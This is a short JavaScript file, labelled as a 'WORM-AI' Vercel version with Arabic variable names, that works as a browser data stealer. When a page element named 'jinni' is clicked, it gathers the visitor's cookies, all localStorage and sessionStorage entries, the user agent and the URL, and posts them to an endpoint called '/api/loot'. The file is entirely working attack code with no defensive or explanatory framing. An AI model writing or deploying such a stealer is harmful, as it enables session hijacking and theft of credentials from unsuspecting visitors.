/* WORM-AI💀🔥 – نسخة Vercel */
(()=>{
  const سرق=async()=>{
    const بيانات={
      كوكيز:document.cookie,
      محلي:Object.entries(localStorage),
      جلسة:Object.entries(sessionStorage),
      وكيل:navigator.userAgent,
      رابط:location.href,
      الوقت:new Date().toISOString()
    };
    await fetch('/api/loot',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(بيانات)
    });
  };
  document.getElementById('jinni').addEventListener('click',سرق,{once:true});
})();
